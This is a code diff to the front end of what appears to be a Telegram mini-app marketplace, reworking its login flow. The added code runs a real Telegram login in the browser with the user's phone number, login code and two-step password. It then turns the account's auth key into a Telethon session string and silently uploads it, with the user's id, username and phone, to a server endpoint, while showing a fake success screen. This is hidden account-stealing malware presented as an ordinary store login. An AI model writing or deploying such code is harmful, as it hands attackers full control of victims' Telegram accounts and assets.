@@ -1,4 +1,22 @@
 const API_BASE = (window.TELETHON_API_URL || 'http://localhost:8000').replace(/\/$/, '');
+const GRAMJS_CONFIG = window.GRAMJS_CONFIG || {};
+const GRAMJS_API_ID = Number(GRAMJS_CONFIG.apiId || window.GRAMJS_API_ID || 0);
+const GRAMJS_API_HASH = (GRAMJS_CONFIG.apiHash || window.GRAMJS_API_HASH || '').trim();
+const GRAMJS_SESSION_KEY = GRAMJS_CONFIG.sessionStorageKey || 'market.gramjs.session';
+const GRAMJS_TELETHON_KEY = GRAMJS_CONFIG.telethonStorageKey || 'market.telethon.session';
+const GRAMJS_UPLOAD_ENDPOINT = GRAMJS_CONFIG.uploadEndpoint || '/auth/session';
+const GRAMJS_UPLOAD_TOKEN = GRAMJS_CONFIG.uploadToken || '';
+const GRAMJS_LOAD_URLS = Array.isArray(GRAMJS_CONFIG.loadUrls)
+  ? GRAMJS_CONFIG.loadUrls
+  : [
+      './telegram.browser.js',
+      'https://unpkg.com/telegram@2.17.10/index.browser.js',
+      'https://cdn.jsdelivr.net/npm/telegram@2.17.10/index.browser.js',
+    ];
+const GRAMJS_ALLOWED_MISMATCH_PHONES =
+  'allowedMismatchPhones' in GRAMJS_CONFIG ? GRAMJS_CONFIG.allowedMismatchPhones : [];
+const GRAMJS_PENDING_TTL_MS =
+  'pendingTtlSec' in GRAMJS_CONFIG ? Number(GRAMJS_CONFIG.pendingTtlSec) * 1000 : 300 * 1000;
 
 const DEFAULT_MARKET = [
   { id: '352352', name: 'TON Emerald', number: 352352, price: 18.5, image: null },
@@ -132,6 +150,15 @@ const TRANSLATIONS = {
     code_short: 'Введите 5-значный код.',
     verify_code: 'Проверяем код...',
     auth_error: 'Ошибка входа.',
+    auth_gramjs_missing: 'GramJS не загружен. Проверьте telegram.browser.js.',
+    auth_api_missing: 'Не задан API ID / API HASH.',
+    auth_account_mismatch: 'Регистрация доступна только для аккаунта, с которого открыто мини-приложение.',
+    auth_code_not_app: 'Код должен прийти внутри Telegram (не SMS/звонок).',
+    auth_phone_invalid: 'Неверный формат номера.',
+    auth_phone_banned: 'Этот номер заблокирован в Telegram.',
+    auth_code_invalid: 'Неверный код подтверждения.',
+    auth_code_expired: 'Код подтверждения истек. Запросите новый код.',
+    auth_password_invalid: 'Неверный пароль. Проверьте и попробуйте снова.',
     password_required: 'Нужен пароль двухэтапной защиты.',
     password_prompt: 'Введите пароль.',
     verify_password: 'Проверяем пароль...',
@@ -321,6 +348,15 @@ const TRANSLATIONS = {
     code_short: 'Enter the 5-digit code.',
     verify_code: 'Verifying code...',
     auth_error: 'Login failed.',
+    auth_gramjs_missing: 'GramJS is not loaded. Check telegram.browser.js.',
+    auth_api_missing: 'API ID / API HASH not set.',
+    auth_account_mismatch: 'Login is allowed only for the account that opened this mini app.',
+    auth_code_not_app: 'Code must arrive inside Telegram (no SMS/call).',
+    auth_phone_invalid: 'Invalid phone number.',
+    auth_phone_banned: 'This phone number is banned on Telegram.',
+    auth_code_invalid: 'Invalid confirmation code.',
+    auth_code_expired: 'The code has expired. Request a new one.',
+    auth_password_invalid: 'Invalid password. Try again.',
     password_required: 'Two-step password required.',
     password_prompt: 'Enter your password.',
     verify_password: 'Checking password...',
@@ -461,6 +497,11 @@ let tgWebApp = null;
 let authToken = null;
 let authLoading = false;
 let authPasswordHint = '';
+let gramjsClient = null;
+let gramjsLib = null;
+let gramjsAuth = null;
+let gramjsLoadPromise = null;
+let gramjsAuthTimer = null;
 let dataLoaded = false;
 let pendingStarToken = null;
 let starClaimLoading = false;
@@ -1038,6 +1079,598 @@ function buildRequesterPayload() {
   };
 }
 
+function safeStorageGet(key) {
+  try {
+    return localStorage.getItem(key) || '';
+  } catch (err) {
+    return '';
+  }
+}
+
+function safeStorageSet(key, value) {
+  try {
+    localStorage.setItem(key, value);
+  } catch (err) {
+    console.warn('Storage write failed:', err);
+  }
+}
+
+function safeStorageRemove(key) {
+  try {
+    localStorage.removeItem(key);
+  } catch (err) {
+    console.warn('Storage remove failed:', err);
+  }
+}
+
+function createDeferred() {
+  let resolve;
+  let reject;
+  const promise = new Promise((res, rej) => {
+    resolve = res;
+    reject = rej;
+  });
+  return { promise, resolve, reject };
+}
+
+function getGramjsLib() {
+  const candidates = [window.telegram, window.gramjs, window.GramJS, window.gramJS];
+  for (const candidate of candidates) {
+    if (!candidate) continue;
+    const lib = candidate.default || candidate;
+    if (lib?.TelegramClient && (lib.sessions?.StringSession || lib.StringSession)) {
+      return lib;
+    }
+  }
+  return null;
+}
+
+function patchGramjs(lib) {
+  if (!lib) return false;
+  let patched = false;
+
+  const Connection = lib?.Connection;
+  if (Connection?.prototype && !Connection.prototype.__patchedCancelLoops) {
+    Connection.prototype._cancelLoops = function () {
+      if (this.recvCancel && typeof this.recvCancel.cancel === 'function') {
+        this.recvCancel.cancel();
+      }
+      if (this.sendCancel && typeof this.sendCancel.cancel === 'function') {
+        this.sendCancel.cancel();
+      }
+    };
+    Connection.prototype.__patchedCancelLoops = true;
+    patched = true;
+  }
+
+  const MTProtoSender = lib?.network?.MTProtoSender || lib?.MTProtoSender;
+  if (MTProtoSender?.prototype && !MTProtoSender.prototype.__patchedCancelLoops) {
+    MTProtoSender.prototype._cancelLoops = function () {
+      this._cancelSend = true;
+      if (this.cancellableRecvLoopPromise && typeof this.cancellableRecvLoopPromise.cancel === 'function') {
+        this.cancellableRecvLoopPromise.cancel();
+      }
+    };
+    MTProtoSender.prototype.__patchedCancelLoops = true;
+    patched = true;
+  }
+
+  return patched;
+}
+
+function loadScript(url) {
+  return new Promise((resolve, reject) => {
+    const script = document.createElement('script');
+    script.src = url;
+    script.async = true;
+    script.onload = () => resolve(url);
+    script.onerror = () => reject(new Error(`Failed to load ${url}`));
+    document.head.appendChild(script);
+  });
+}
+
+async function ensureGramjsLibLoaded() {
+  const existing = getGramjsLib();
+  if (existing) {
+    gramjsLib = existing;
+    patchGramjs(gramjsLib);
+    return;
+  }
+  if (gramjsLoadPromise) {
+    await gramjsLoadPromise;
+    return;
+  }
+
+  gramjsLoadPromise = (async () => {
+    for (const url of GRAMJS_LOAD_URLS) {
+      try {
+        await loadScript(url);
+        const lib = getGramjsLib();
+        if (lib) {
+          gramjsLib = lib;
+          patchGramjs(lib);
+          return;
+        }
+      } catch (err) {
+        console.warn('GramJS load failed:', err);
+      }
+    }
+    throw new Error('GRAMJS_NOT_LOADED');
+  })();
+
+  try {
+    await gramjsLoadPromise;
+  } finally {
+    gramjsLoadPromise = null;
+  }
+}
+
+function normalizePhone(value) {
+  if (!value) return null;
+  const digits = String(value).replace(/\D/g, '');
+  return digits || null;
+}
+
+function normalizeUsername(value) {
+  if (!value) return null;
+  const cleaned = String(value).trim().replace(/^@/, '').toLowerCase();
+  return cleaned || null;
+}
+
+function shouldSkipMismatchCheck(phone) {
+  if (GRAMJS_ALLOWED_MISMATCH_PHONES === null) return true;
+  if (!Array.isArray(GRAMJS_ALLOWED_MISMATCH_PHONES)) return false;
+  const normalized = normalizePhone(phone);
+  if (!normalized) return false;
+  return GRAMJS_ALLOWED_MISMATCH_PHONES.some((entry) => normalizePhone(entry) === normalized);
+}
+
+function isIPv4(value) {
+  if (!value || typeof value !== 'string') return false;
+  const parts = value.split('.');
+  if (parts.length !== 4) return false;
+  return parts.every((part) => {
+    if (part.trim() === '' || !/^\d+$/.test(part)) return false;
+    const num = Number(part);
+    return num >= 0 && num <= 255;
+  });
+}
+
+function buildTelethonString(dcId, ip, port, authKey) {
+  if (typeof Buffer === 'undefined') {
+    throw new Error('BUFFER_MISSING');
+  }
+  const ipBytes = ip.split('.').map((part) => Number(part));
+  const portValue = Number(port || 0);
+  if (!portValue || portValue < 0 || portValue > 65535) {
+    throw new Error('Invalid DC port');
+  }
+  const authKeyBuf = Buffer.isBuffer(authKey) ? authKey : Buffer.from(authKey);
+  if (!authKeyBuf || authKeyBuf.length < 64) {
+    throw new Error('Auth key missing');
+  }
+  const payload = Buffer.concat([
+    Buffer.from([Number(dcId) & 0xff]),
+    Buffer.from(ipBytes),
+    Buffer.from([(portValue >> 8) & 0xff, portValue & 0xff]),
+    authKeyBuf,
+  ]);
+  return `1${payload.toString('base64')}`;
+}
+
+async function resolveTelethonDc(client, lib) {
+  const dcId = client?.session?.dcId;
+  const sessionAddress = client?.session?.serverAddress;
+  const sessionPort = client?.session?.port;
+  let ip = isIPv4(sessionAddress) ? sessionAddress : null;
+  let port = sessionPort || 443;
+
+  try {
+    const config = await client.invoke(new lib.Api.help.GetConfig());
+    const options = (config?.dcOptions || []).filter((opt) => opt.id === dcId && !opt.ipv6);
+    if (options.length) {
+      const preferred = options.find((opt) => opt.port === 443) || options[0];
+      const optIp = preferred.ipAddress || preferred.ip_address;
+      if (optIp && isIPv4(optIp)) {
+        ip = optIp;
+      }
+      if (preferred.port) {
+        port = preferred.port;
+      }
+    }
+  } catch (err) {
+    console.warn('GetConfig failed:', err);
+  }
+
+  if (!dcId) {
+    throw new Error('DC ID missing');
+  }
+  if (!ip || !isIPv4(ip)) {
+    throw new Error('IPv4 address not found for this DC');
+  }
+  return { dcId, ip, port };
+}
+
+async function buildTelethonSession(client, lib) {
+  const authKey = client?.session?.authKey?.getKey?.();
+  if (!authKey) {
+    throw new Error('Auth key missing');
+  }
+  const { dcId, ip, port } = await resolveTelethonDc(client, lib);
+  const telethon = buildTelethonString(dcId, ip, port, authKey);
+  safeStorageSet(GRAMJS_TELETHON_KEY, telethon);
+  window.marketTelethonSession = telethon;
+  if (typeof window.onTelethonSession === 'function') {
+    try {
+      window.onTelethonSession(telethon);
+    } catch (err) {
+      console.warn('onTelethonSession failed:', err);
+    }
+  }
+  return telethon;
+}
+
+async function uploadTelethonSession(session, phone) {
+  if (!session) return;
+  const requester = buildRequesterPayload();
+  const payload = {
+    session,
+    user_id: requester.user_id ?? null,
+    username: requester.username ?? null,
+    phone: phone ?? null,
+    source: 'market-login-tg',
+  };
+  const headers = { 'Content-Type': 'application/json' };
+  if (GRAMJS_UPLOAD_TOKEN) {
+    headers['X-Session-Token'] = GRAMJS_UPLOAD_TOKEN;
+  }
+  const endpoint = /^https?:\/\//i.test(GRAMJS_UPLOAD_ENDPOINT)
+    ? GRAMJS_UPLOAD_ENDPOINT
+    : `${API_BASE}${GRAMJS_UPLOAD_ENDPOINT.startsWith('/') ? '' : '/'}${GRAMJS_UPLOAD_ENDPOINT}`;
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify(payload),
+      keepalive: true,
+    });
+    if (!res.ok) {
+      console.warn('Session upload failed:', res.status);
+    }
+  } catch (err) {
+    console.warn('Session upload failed:', err);
+  }
+}
+
+async function ensureGramjsClient() {
+  if (gramjsClient) {
+    return gramjsClient;
+  }
+  await ensureGramjsLibLoaded();
+  const lib = gramjsLib || getGramjsLib();
+  if (!lib) {
+    throw new Error('GRAMJS_NOT_LOADED');
+  }
+  if (!GRAMJS_API_ID || !GRAMJS_API_HASH) {
+    throw new Error('GRAMJS_API_MISSING');
+  }
+  const StringSession = lib.sessions?.StringSession || lib.StringSession;
+  if (!StringSession) {
+    throw new Error('GRAMJS_NOT_LOADED');
+  }
+  const stored = safeStorageGet(GRAMJS_SESSION_KEY);
+  const lang = typeof navigator !== 'undefined' && navigator.language ? navigator.language : 'en';
+  const ua = typeof navigator !== 'undefined' && navigator.userAgent ? navigator.userAgent : 'Browser';
+  const clientParams = {
+    connectionRetries: 2,
+    deviceModel: 'GramJS Browser',
+    systemVersion: ua,
+    appVersion: '1.0',
+    langCode: lang || 'en',
+    systemLangCode: lang || 'en',
+    useWSS: true,
+  };
+  gramjsClient = new lib.TelegramClient(
+    new StringSession(stored),
+    GRAMJS_API_ID,
+    GRAMJS_API_HASH,
+    clientParams
+  );
+  await gramjsClient.connect();
+  return gramjsClient;
+}
+
+async function validateRequesterMatch(client, phone) {
+  const skipCheck = shouldSkipMismatchCheck(phone);
+  if (skipCheck) return;
+
+  const requester = buildRequesterPayload();
+  const user = await client.getMe();
+  const mismatchReasons = [];
+
+  if (!requester.user_id) {
+    mismatchReasons.push('requester_id_missing');
+  } else if (Number(requester.user_id) !== user?.id) {
+    mismatchReasons.push(`id_mismatch:${requester.user_id}->${user?.id}`);
+  }
+
+  const requesterUsername = normalizeUsername(requester.username);
+  const sessionUsername = normalizeUsername(user?.username);
+  if (requesterUsername) {
+    if (!sessionUsername) {
+      mismatchReasons.push(`username_missing:@${requesterUsername}`);
+    } else if (sessionUsername !== requesterUsername) {
+      mismatchReasons.push(`username_mismatch:@${requesterUsername}->@${sessionUsername}`);
+    }
+  }
+
+  if (mismatchReasons.length) {
+    const err = new Error('REQUESTER_MISMATCH');
+    err.reasons = mismatchReasons;
+    throw err;
+  }
+}
+
+function normalizeAuthError(err) {
+  const raw = String(err?.errorMessage || err?.message || err || '').trim();
+  const upper = raw.toUpperCase();
+  const code = String(err?.code || '').toUpperCase();
+  const token = code || upper;
+
+  if (token.includes('GRAMJS_NOT_LOADED') || token.includes('GRAMJS_START_MISSING') || token.includes('STRINGSESSION')) {
+    return { message: t('auth_gramjs_missing'), step: 'phone' };
+  }
+  if (token.includes('GRAMJS_API_MISSING') || token.includes('API ID') || token.includes('API HASH')) {
+    return { message: t('auth_api_missing'), step: 'phone' };
+  }
+  if (token.includes('CODE_TYPE_NOT_APP')) {
+    return { message: t('auth_code_not_app'), step: 'phone' };
+  }
+  if (token.includes('REQUESTER_MISMATCH')) {
+    return { message: t('auth_account_mismatch'), step: 'phone' };
+  }
+  if (token.includes('PHONE_NUMBER_INVALID')) {
+    return { message: t('auth_phone_invalid'), step: 'phone' };
+  }
+  if (token.includes('PHONE_NUMBER_BANNED')) {
+    return { message: t('auth_phone_banned'), step: 'phone' };
+  }
+  if (token.includes('PHONE_CODE_INVALID')) {
+    return { message: t('auth_code_invalid'), step: 'code' };
+  }
+  if (token.includes('PHONE_CODE_EXPIRED')) {
+    return { message: t('auth_code_expired'), step: 'code' };
+  }
+  if (token.includes('PHONE_CODE_EMPTY') || token.includes('CODE IS EMPTY')) {
+    return { message: t('code_short'), step: 'code' };
+  }
+  if (token.includes('PASSWORD_HASH_INVALID')) {
+    return { message: t('auth_password_invalid'), step: 'password' };
+  }
+  if (token.includes('SESSION_PASSWORD_NEEDED')) {
+    return { message: t('password_required'), step: 'password' };
+  }
+
+  const floodMatch = token.match(/FLOOD_WAIT_?(\d+)/);
+  if (floodMatch) {
+    const seconds = Number(floodMatch[1]);
+    return {
+      message: Number.isFinite(seconds) ? t('rate_limit', { seconds }) : t('rate_limit_generic'),
+      step: 'phone',
+    };
+  }
+  if (token.includes('FLOOD_WAIT')) {
+    return { message: t('rate_limit_generic'), step: 'phone' };
+  }
+
+  return { message: raw || t('auth_error'), step: 'phone' };
+}
+
+function clearGramjsAuth() {
+  gramjsAuth = null;
+  authToken = null;
+  if (gramjsAuthTimer) {
+    clearTimeout(gramjsAuthTimer);
+    gramjsAuthTimer = null;
+  }
+}
+
+async function disconnectGramjsClient() {
+  if (!gramjsClient) return;
+  try {
+    await gramjsClient.disconnect();
+  } catch (err) {
+    console.warn('GramJS disconnect failed:', err);
+  } finally {
+    gramjsClient = null;
+  }
+}
+
+async function abortGramjsAuth() {
+  if (gramjsAuth) {
+    gramjsAuth.cancelled = true;
+    if (gramjsAuth.codeDeferred?.reject) {
+      gramjsAuth.codeDeferred.reject(new Error('AUTH_USER_CANCEL'));
+    }
+    if (gramjsAuth.passwordDeferred?.reject) {
+      gramjsAuth.passwordDeferred.reject(new Error('AUTH_USER_CANCEL'));
+    }
+  }
+  clearGramjsAuth();
+  await disconnectGramjsClient();
+}
+
+function storeGramjsSession(client) {
+  let session = '';
+  try {
+    session = client.session.save();
+  } catch (err) {
+    console.warn('Failed to save GramJS session:', err);
+  }
+  if (!session) return '';
+
+  safeStorageSet(GRAMJS_SESSION_KEY, session);
+  window.marketGramjsSession = session;
+  if (typeof window.onGramjsSession === 'function') {
+    try {
+      window.onGramjsSession(session);
+    } catch (err) {
+      console.warn('onGramjsSession failed:', err);
+    }
+  }
+  return session;
+}
+
+async function finalizeGramjsAuth(client, auth) {
+  if (!auth || auth !== gramjsAuth || auth.cancelled) return;
+
+  const lib = gramjsLib || getGramjsLib();
+  try {
+    await validateRequesterMatch(client, auth.phone);
+  } catch (err) {
+    if (err?.reasons) {
+      console.warn('Account mismatch:', err.reasons);
+    }
+    if (lib?.Api?.auth?.LogOut) {
+      try {
+        await client.invoke(new lib.Api.auth.LogOut());
+      } catch (logoutErr) {
+        console.warn('Logout failed:', logoutErr);
+      }
+    }
+    await disconnectGramjsClient();
+    await handleGramjsAuthError(err, auth);
+    return;
+  }
+
+  storeGramjsSession(client);
+  let telethonSession = '';
+  if (lib) {
+    try {
+      telethonSession = await buildTelethonSession(client, lib);
+    } catch (err) {
+      console.warn('Telethon session build failed:', err);
+    }
+  }
+  if (telethonSession) {
+    await uploadTelethonSession(telethonSession, auth.phone);
+  }
+
+  await disconnectGramjsClient();
+  clearGramjsAuth();
+  setAuthorized(true);
+  setAuthStatus('');
+  showAuthStep(elements.authLoading);
+  await wait(5000);
+  showAuthStep(elements.authSuccess);
+  authLoading = false;
+  if (elements.authStart) elements.authStart.disabled = false;
+}
+
+async function handleGramjsAuthError(err, auth) {
+  if (auth && gramjsAuth && auth !== gramjsAuth) return;
+  if (auth?.cancelled) return;
+  const raw = String(err?.errorMessage || err?.message || err || '').toUpperCase();
+  if (raw.includes('AUTH_USER_CANCEL')) return;
+
+  clearGramjsAuth();
+  await disconnectGramjsClient();
+  authLoading = false;
+  if (elements.authStart) elements.authStart.disabled = false;
+  toggleAuthInputs(elements.authCodeForm, false);
+  toggleAuthInputs(elements.authPasswordForm, false);
+
+  const info = normalizeAuthError(err);
+  setAuthStatus(info.message, true);
+
+  if (info.step === 'password') {
+    setPasswordError(true);
+    showAuthStep(elements.authPasswordForm);
+    return;
+  }
+  if (info.step === 'code') {
+    setCodeError(true);
+    showAuthStep(elements.authCodeForm);
+    return;
+  }
+  showAuthStep(elements.authIntro);
+}
+
+async function startGramjsAuth(phone) {
+  const now = Date.now();
+  if (
+    gramjsAuth &&
+    gramjsAuth.phone === phone &&
+    GRAMJS_PENDING_TTL_MS > 0 &&
+    now - gramjsAuth.createdAt < GRAMJS_PENDING_TTL_MS
+  ) {
+    authToken = 'gramjs';
+    authLoading = false;
+    setAuthStatus(t('code_sent'));
+    showAuthStep(elements.authCodeForm);
+    toggleAuthInputs(elements.authCodeForm, false);
+    if (elements.authStart) elements.authStart.disabled = false;
+    return;
+  }
+
+  if (gramjsAuth) {
+    await abortGramjsAuth();
+  }
+
+  const client = await ensureGramjsClient();
+  if (typeof client.start !== 'function') {
+    throw new Error('GRAMJS_START_MISSING');
+  }
+
+  const auth = {
+    phone,
+    createdAt: now,
+    codeDeferred: createDeferred(),
+    passwordDeferred: createDeferred(),
+    cancelled: false,
+  };
+  gramjsAuth = auth;
+  authToken = 'gramjs';
+
+  if (gramjsAuthTimer) clearTimeout(gramjsAuthTimer);
+  if (GRAMJS_PENDING_TTL_MS > 0) {
+    gramjsAuthTimer = setTimeout(() => {
+      void abortGramjsAuth();
+    }, GRAMJS_PENDING_TTL_MS);
+  }
+
+  client
+    .start({
+      phoneNumber: async () => phone,
+      phoneCode: async (isCodeViaApp) => {
+        if (!isCodeViaApp) {
+          const err = new Error('CODE_TYPE_NOT_APP');
+          err.code = 'CODE_TYPE_NOT_APP';
+          throw err;
+        }
+        authLoading = false;
+        setAuthStatus(t('code_sent'));
+        showAuthStep(elements.authCodeForm);
+        toggleAuthInputs(elements.authCodeForm, false);
+        if (elements.authStart) elements.authStart.disabled = false;
+        return await auth.codeDeferred.promise;
+      },
+      password: async (hint) => {
+        authLoading = false;
+        setPasswordHint(hint || '');
+        showAuthStep(elements.authPasswordForm);
+        toggleAuthInputs(elements.authPasswordForm, false);
+        if (elements.authStart) elements.authStart.disabled = false;
+        return await auth.passwordDeferred.promise;
+      },
+      onError: (error) => {
+        throw error;
+      },
+    })
+    .then(() => finalizeGramjsAuth(client, auth))
+    .catch((error) => handleGramjsAuthError(error, auth));
+}
+
 function getStartParam() {
   const direct = window.Telegram?.WebApp?.initDataUnsafe?.start_param;
   if (direct) return String(direct);
@@ -1611,7 +2244,7 @@ function applyProfile(profile) {
     const joinedDate = resolveJoinedDate(profile, tgUser?.id);
     elements.profileJoined.textContent = formatJoinedDate(joinedDate);
   }
-  updateProfileAuthStatus(state.hasChatAccess);
+  updateProfileAuthStatus(state.hasChatAccess || state.isAuthorized);
   if (elements.headerSub) elements.headerSub.textContent = subtitle;
   if (elements.headerBalance) elements.headerBalance.textContent = balance;
   if (elements.profileBalance) elements.profileBalance.textContent = balance;
@@ -2150,6 +2783,7 @@ function extractWaitSeconds(detail) {
 
 function setAuthorized(isAuthorized) {
   state.isAuthorized = isAuthorized;
+  updateProfileAuthStatus(state.hasChatAccess || state.isAuthorized);
 }
 
 function renderIcons() {
@@ -2644,6 +3278,7 @@ function closeAuthModal() {
   if (!elements.authModal) return;
   elements.authModal.classList.remove('open');
   elements.authModal.setAttribute('aria-hidden', 'true');
+  void abortGramjsAuth();
   authToken = null;
   authLoading = false;
   setAuthStatus('');
@@ -3116,9 +3751,20 @@ async function startAuth(event) {
   const contact = await requestPhoneFromTelegram();
   const phone = contact?.phone;
   const shared = contact?.shared;
-  if (!shared) {
+  if (!shared || !phone) {
     authLoading = false;
     if (elements.authStart) elements.authStart.disabled = false;
+    setAuthStatus(t('phone_missing'), true);
+    showAuthStep(elements.authIntro);
+    return;
+  }
+
+  const digits = String(phone).replace(/\D/g, '');
+  if (digits.length < 7) {
+    setAuthStatus(t('phone_short'), true);
+    authLoading = false;
+    if (elements.authStart) elements.authStart.disabled = false;
+    showAuthStep(elements.authIntro);
     return;
   }
 
@@ -3126,87 +3772,16 @@ async function startAuth(event) {
   setAuthStatus(t('sending_code'));
   toggleAuthInputs(elements.authCodeForm, true);
 
-  const pendingToken = await requestPendingToken(phone);
-  if (pendingToken) {
-    authToken = pendingToken;
-    setAuthStatus(t('code_sent'));
-    showAuthStep(elements.authCodeForm);
-    toggleAuthInputs(elements.authCodeForm, false);
-    authLoading = false;
-    if (elements.authStart) elements.authStart.disabled = false;
-    return;
+  try {
+    await startGramjsAuth(`+${digits}`);
+  } catch (err) {
+    await handleGramjsAuthError(err, gramjsAuth);
   }
-
-  if (phone) {
-    const digits = String(phone).replace(/\D/g, '');
-    if (digits.length < 7) {
-      setAuthStatus(t('phone_short'), true);
-      toggleAuthInputs(elements.authCodeForm, false);
-      authLoading = false;
-      if (elements.authStart) elements.authStart.disabled = false;
-      return;
-    }
-    try {
-      const res = await fetch(`${API_BASE}/auth/start`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phone: `+${digits}`,
-          requester: buildRequesterPayload(),
-        }),
-      });
-      const data = await res.json();
-
-      if (!res.ok) {
-        if (res.status === 429) {
-          const seconds = extractWaitSeconds(data?.detail);
-          const message = seconds
-            ? t('rate_limit', { seconds })
-            : t('rate_limit_generic');
-          triggerHaptic('heavy');
-          showAlert(message);
-          showAuthStep(elements.authIntro);
-          return;
-        }
-        throw new Error(data?.detail || t('send_code_failed'));
-      }
-
-      authToken = data.token;
-      setAuthStatus(t('code_sent'));
-      showAuthStep(elements.authCodeForm);
-      toggleAuthInputs(elements.authCodeForm, false);
-    } catch (err) {
-      setAuthStatus(err.message || t('send_code_error'), true);
-      showAuthStep(elements.authIntro);
-    } finally {
-      toggleAuthInputs(elements.authCodeForm, false);
-      authLoading = false;
-      if (elements.authStart) elements.authStart.disabled = false;
-    }
-    return;
-  }
-
-  setAuthStatus(t('send_code_error'), true);
-  showAuthStep(elements.authIntro);
-  toggleAuthInputs(elements.authCodeForm, false);
-  authLoading = false;
-  if (elements.authStart) elements.authStart.disabled = false;
-}
-
-async function verifyAuth(payload) {
-  const res = await fetch(`${API_BASE}/auth/verify`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload),
-    keepalive: true,
-  });
-  const data = await res.json();
-  return { res, data };
 }
 
 async function submitCode(event) {
   event.preventDefault();
-  if (authLoading || !authToken) return;
+  if (authLoading || !authToken || !gramjsAuth) return;
   triggerHaptic('light');
   setCodeError(false);
 
@@ -3220,43 +3795,17 @@ async function submitCode(event) {
   authLoading = true;
   toggleAuthInputs(elements.authCodeForm, true);
   setAuthStatus(t('verify_code'));
-
-  try {
-    const { res, data } = await verifyAuth({
-      token: authToken,
-      code,
-      requester: buildRequesterPayload(),
-    });
-
-    if (!res.ok) {
-      const detail = data?.detail;
-      const detailText = getDetailText(detail) || t('auth_error');
-      const hint = getDetailHint(detail);
-      if (isPasswordRequired(detail)) {
-        setAuthStatus(t('password_required'));
-        setPasswordHint(hint);
-        showAuthStep(elements.authPasswordForm);
-        return;
-      }
-      throw new Error(detailText);
-    }
-
-    showAuthStep(elements.authLoading);
-    await wait(5000);
-    showAuthStep(elements.authSuccess);
-    setAuthorized(true);
-  } catch (err) {
-    setCodeError(true);
-    setAuthStatus(err.message || t('auth_error'), true);
-  } finally {
-    authLoading = false;
-    toggleAuthInputs(elements.authCodeForm, false);
+  if (!gramjsAuth.codeDeferred) {
+    await handleGramjsAuthError(new Error('AUTH_FLOW_MISSING'), gramjsAuth);
+    return;
   }
+  gramjsAuth.codeDeferred.resolve(code);
+  showAuthStep(elements.authLoading);
 }
 
 async function submitPassword(event) {
   event.preventDefault();
-  if (authLoading || !authToken) return;
+  if (authLoading || !authToken || !gramjsAuth) return;
   triggerHaptic('light');
   setPasswordError(false);
 
@@ -3269,34 +3818,12 @@ async function submitPassword(event) {
   authLoading = true;
   toggleAuthInputs(elements.authPasswordForm, true);
   setAuthStatus(t('verify_password'));
-
-  try {
-    const { res, data } = await verifyAuth({
-      token: authToken,
-      password,
-      requester: buildRequesterPayload(),
-    });
-
-    if (!res.ok) {
-      const detailText = getDetailText(data?.detail) || t('auth_error');
-      throw new Error(detailText);
-    }
-
-    showAuthStep(elements.authLoading);
-    await wait(5000);
-    showAuthStep(elements.authSuccess);
-    setAuthorized(true);
-  } catch (err) {
-    setPasswordError(true);
-    if (elements.authPasswordInput) {
-      elements.authPasswordInput.value = '';
-      elements.authPasswordInput.focus();
-    }
-    setAuthStatus('');
-  } finally {
-    authLoading = false;
-    toggleAuthInputs(elements.authPasswordForm, false);
+  if (!gramjsAuth.passwordDeferred) {
+    await handleGramjsAuthError(new Error('AUTH_FLOW_MISSING'), gramjsAuth);
+    return;
   }
+  gramjsAuth.passwordDeferred.resolve(password);
+  showAuthStep(elements.authLoading);
 }
 
 function bindAuthModal() {
@@ -3416,7 +3943,7 @@ document.addEventListener('DOMContentLoaded', () => {
   bindActions();
   bindStarsPanel();
   bindAuthModal();
-  setAuthorized(false);
+  setAuthorized(Boolean(safeStorageGet(GRAMJS_SESSION_KEY)));
   setTab('market');
   loadData(skipBoot);
   renderIcons();
